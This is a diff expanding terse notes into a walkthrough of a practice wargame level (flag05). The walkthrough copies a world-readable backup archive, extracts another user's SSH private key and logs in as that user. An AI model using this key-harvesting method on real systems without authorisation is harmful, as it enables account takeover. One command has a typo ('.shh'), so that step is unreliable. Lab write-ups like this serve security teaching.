@@ -1,9 +1,18 @@
 Check the flag05 home directory. You are looking for weak directory permissions
 
-.backup executable for everyone
-cp to our home, give chmod 777
-unpack
-ssh keys!
-log on ssh
-getflag
+After logging in and moving to /home/flag05 directory we can check files and their permissions using ls -la.
+There are only two directories .backup and .ssh, but .ssh has permissions set to rwx only for an owner.
+.backup directory has r-x permissions set for our group. Inside this directory we can find a .tgz archive but we are not permitted to unpack it.
 
+Because .backup is readable and executable we can copy it to our home folder, where then we can change privileges to archive file.
+> cp -r .backup /home/level05
+> chmod 777 .backup
+> cd .backup
+> tar -xvf archive.tgz
+
+Now we have a backup of flag05 .ssh directory, where we can find public and private ssh key, as well as known hosts. 
+Using these files we can log in via ssh.
+> cp -r .shh ~/
+> ssh flag05@localhost
+> getflag
+You have successfully executed getflag on a target account.
